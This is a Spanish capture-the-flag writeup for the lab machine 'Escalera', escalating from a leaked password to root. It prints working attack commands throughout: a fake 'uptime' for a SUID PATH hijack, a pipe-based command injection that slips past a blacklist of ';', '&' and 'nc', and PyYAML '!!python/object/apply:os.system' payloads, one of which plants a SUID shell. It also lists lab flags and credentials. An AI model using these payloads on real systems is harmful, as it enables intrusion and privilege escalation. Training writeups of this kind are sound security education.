---
tags: [ctf, thehackerslabs, linux, escalada, suid, path-hijack, command-injection, flask, pyyaml, sudo, writeup]
plataforma: The Hackers Labs
os: Ubuntu 26.04.1 LTS
dificultad: facil-media (cadena por niveles)
estado: Resuelto
fecha: 2026-11-03
---

# Escalera — Roadmap / Writeup

> [!success] Resultado
> - **USER flag** (`/home/medio/user.txt`): `THL{M3di0St3p892kLq1wZ4vX}`
> - **ROOT flag** (`/root/root.txt`): `THL{R00tC1m4Esc4l3r477kNmP}`

Nota principal: [[Escalera]] · Evidencias: [[Escalera - Evidencias]]

---

## 🗺️ Roadmap

```
┌───────────────┐   /pass.txt        ┌───────────────┐
│   EXTERNO     │ ─────────────────▶ │     facil     │
│  80/22        │  facil:Escal0n...  │  (SSH, uid 1001)│
└───────────────┘                    └───────┬───────┘
                                             │ SUID escalon_medio
                                             │ PATH hijack (system("uptime"))
                                             ▼
                                     ┌───────────────┐
                                     │     medio     │
                                     │  (uid 1002)   │
                                     └───────┬───────┘
                                             │ token + Flask 127.0.0.1:8080
                                             │ command injection (host=)
                                             ▼
                                     ┌───────────────┐
                                     │    dificil    │
                                     │  (uid 1003)   │
                                     └───────┬───────┘
                                             │ sudo NOPASSWD
                                             │ yaml.Loader (PyYAML)
                                             ▼
                                     ┌───────────────┐
                                     │     root      │
                                     │   (uid 0)     │
                                     └───────────────┘
```

**Cadena:** `facil` → `medio` → `dificil` → `root`

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| IP objetivo | `192.168.56.111` |
| Atacante | `192.168.56.1` (vboxnet0, Host-Only) |
| Hostname | `TheHackersLabs-Escalera` |
| SO | Ubuntu 26.04.1 LTS (kernel `7.0.0-38-generic`) |
| Servicios | 22 SSH · 80 nginx · 8080 Flask (solo localhost) |
| MAC | `08:00:27:8C:06:26` |

---

## 1. Reconocimiento

```bash
# Descubrimiento (la MAC de la VM es 08:00:27:8C:06:26)
nmap -sn 192.168.56.0/24

# Puertos
nmap -p- --min-rate 2000 -T4 -oN nmap/allports.txt 192.168.56.111
nmap -sV -sC -p22,80 -oN nmap/services.txt 192.168.56.111
```

```
22/tcp open  ssh   OpenSSH 10.2p1 Ubuntu 2ubuntu3.6
80/tcp open  http  nginx 1.28.3 (Ubuntu) — http-title: 403 Forbidden
```

La raíz devuelve `403 Forbidden`, así que se enumera contenido:

```bash
gobuster dir -u http://192.168.56.111/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 60 -x html,php,txt,zip,bak,old
```

```
pass.txt   (Status: 200) [Size: 23]
```

```bash
curl -s http://192.168.56.111/pass.txt
# facil:Escal0nFacil2026
```

> [!note] La raíz 403 es un directorio sin `index` y con `autoindex off`; no hay que
> insistir en `/`, el contenido útil está en ficheros sueltos.

---

## 2. Acceso inicial — `facil`

```bash
ssh facil@192.168.56.111
# contraseña: Escal0nFacil2026
```

```bash
id
# uid=1001(facil) gid=1001(facil) groups=1001(facil)

sudo -n -l
# Sorry, user facil may not run sudo on TheHackersLabs-Escalera.
```

Enumeración de SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
# ...
# /usr/local/bin/escalon_medio   ← SUID de medio
```

---

## 3. `facil` → `medio` (SUID + PATH hijack)

`/usr/local/bin/escalon_medio` es un ELF SUID de `medio`, **no stripped**. Sus
símbolos delatan el fallo:

```bash
file /usr/local/bin/escalon_medio
# setuid ELF 64-bit ... not stripped

strings -n 4 /usr/local/bin/escalon_medio | grep -iE 'system|uptime|setres|gete'
# system
# uptime
# setresuid
# setresgid
# geteuid
# getegid
```

El binario ejecuta `system("uptime")` sin sanear el `PATH`. Se crea un `uptime`
falso en `/tmp/x` y se antepone al `PATH`:

```bash
mkdir -p /tmp/x
printf '#!/bin/sh\nexec /bin/sh /tmp/x/cmd\n' > /tmp/x/uptime
chmod +x /tmp/x/uptime

cat > /tmp/x/cmd <<'EOF'
id
cat /home/medio/user.txt
cat /home/medio/.token
EOF

PATH=/tmp/x:$PATH /usr/local/bin/escalon_medio
```

Salida:

```
uid=1002(medio) gid=1001(facil) groups=1001(facil)
THL{M3di0St3p892kLq1wZ4vX}          ← FLAG DE USUARIO
M3di0T0k3nS3ss10n9841X              ← token del servicio interno
```

> [!tip] Ventana reutilizable
> `/tmp/x/uptime` ejecuta siempre `/tmp/x/cmd`; basta cambiar el contenido de
> `cmd` y volver a lanzar `PATH=/tmp/x:$PATH /usr/local/bin/escalon_medio`
> para ejecutar cualquier orden como `medio`.

---

## 4. `medio` → `dificil` (Flask interno + command injection)

### 4.1 Enumeración del servicio

```bash
ss -lntp
# tcp LISTEN 127.0.0.1:8080

cat /etc/systemd/system/escalon_dificil.service
# User=dificil
# ExecStart=/usr/bin/python3 /opt/escalon_dificil/app.py

cat /etc/systemd/system/firewall_ctf.service
# iptables: solo UID medio y dificil pueden salir al puerto 8080
```

`/opt/escalon_dificil/app.py`:

- Autenticación por cabecera `X-Auth-Token` / `Authorization`.
- Token válido: `M3di0T0k3nS3ss10n9841X` (leído de `/home/medio/.token`).
- Endpoint `/diagnostico?host=...`:

```python
cmd = f"ping -c 1 {host}"
output = subprocess.check_output(cmd, shell=True, ...)
```

- WAF por lista negra: solo bloquea `;`, `&` y `nc`. El pipe `|` pasa.

### 4.2 Inyección como `medio`

La regla de iptables permite la conexión al UID `medio`; se lanza el curl desde
la ventana SUID:

```bash
cat > /tmp/x/cmd <<'EOF'
curl -s -H "X-Auth-Token: M3di0T0k3nS3ss10n9841X" \
  -G --data-urlencode 'host=127.0.0.1 | id' \
  'http://127.0.0.1:8080/diagnostico'
EOF
PATH=/tmp/x:$PATH /usr/local/bin/escalon_medio
```

Respuesta (dentro del `<pre>`):

```
uid=1003(dificil) gid=1003(dificil) groups=1003(dificil)
```

### 4.3 Lectura de secretos como `dificil`

```bash
cat > /tmp/x/dcmd <<'EOF'
cat /home/dificil/.credenciales
sudo -n -l
EOF
chmod 644 /tmp/x/dcmd

cat > /tmp/x/cmd <<'EOF'
curl -s -H "X-Auth-Token: M3di0T0k3nS3ss10n9841X" \
  -G --data-urlencode 'host=127.0.0.1 | sh /tmp/x/dcmd' \
  'http://127.0.0.1:8080/diagnostico' | sed -n '/<pre>/,/<\/pre>/p'
EOF
PATH=/tmp/x:$PATH /usr/local/bin/escalon_medio
```

```
dificil:D1f1c1lStairs89

User dificil may run the following commands on TheHackersLabs-Escalera:
    (root) NOPASSWD: /usr/bin/python3 /opt/admin/gestion_sistema.py *
```

---

## 5. `dificil` → `root` (PyYAML `yaml.Loader`)

`/opt/admin/gestion_sistema.py`:

```python
cfg = sys.argv[1]
with open(cfg, "r") as f:
    contenido = f.read()
yaml.load(contenido, Loader=yaml.Loader)   # ← deserialización insegura
```

`yaml.Loader` permite instanciar objetos Python arbitrarios. Como `dificil`
puede ejecutar el script con `sudo NOPASSWD` y pasarle cualquier fichero:

```yaml
# /tmp/x/evil.yml
!!python/object/apply:os.system ["id > /tmp/x/root_id; cat /root/root.txt > /tmp/x/rootflag; chmod 644 /tmp/x/rootflag"]
```

```bash
# ejecutado como dificil
sudo -n /usr/bin/python3 /opt/admin/gestion_sistema.py /tmp/x/evil.yml
```

Resultado:

```bash
cat /tmp/x/root_id
# uid=0(root) gid=0(root) groups=0(root)

cat /tmp/x/rootflag
# THL{R00tC1m4Esc4l3r477kNmP}
```

> [!warning] Alternativa
> También vale `!!python/object/apply:os.system ['cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb']`
> y luego `/tmp/rb -p`, pero escribir la flag a `/tmp` es más rápido para el CTF.

---

## 6. Resumen de credenciales y secretos

| Elemento | Valor |
|---|---|
| Web `/pass.txt` | `facil:Escal0nFacil2026` |
| `/home/medio/.token` | `M3di0T0k3nS3ss10n9841X` |
| `/home/dificil/.credenciales` | `dificil:D1f1c1lStairs89` |
| Sudo de `dificil` | `(root) NOPASSWD: /usr/bin/python3 /opt/admin/gestion_sistema.py *` |

---

## 7. Qué funcionó / qué aprendí

**Qué funcionó**
- `gobuster` con lista media sobre una raíz 403 → `/pass.txt`.
- SUID que llama a `system("uptime")` → hijack de `PATH`.
- Login en el Flask interno con el token de `medio` + pipe `|` en `host`.
- `yaml.load` con `yaml.Loader` sobre un fichero controlado vía `sudo NOPASSWD`.

**Qué aprendí**
- Un WAF por lista negra que no filtra `|`, `` ` `` ni `$()` no sirve de nada.
- Un binario SUID que ejecuta comandos por nombre relativo es un `PATH` hijack.
- `yaml.load` no es un parser de configuración: es deserialización de objetos.
- Aislar por UID en iptables no protege si el atacante ya controla ese UID.

## 8. Limpieza realizada

```bash
# en el objetivo
rm -rf /tmp/x
```

---

## 9. Referencias

- [[Escalera]] — ficha de la máquina
- [[Escalera - Evidencias]] — salidas de nmap y comandos clave
- [[GTFOBins]] — abuso de binarios SUID
- [[Cheatsheet-Linux-PrivEsc]]
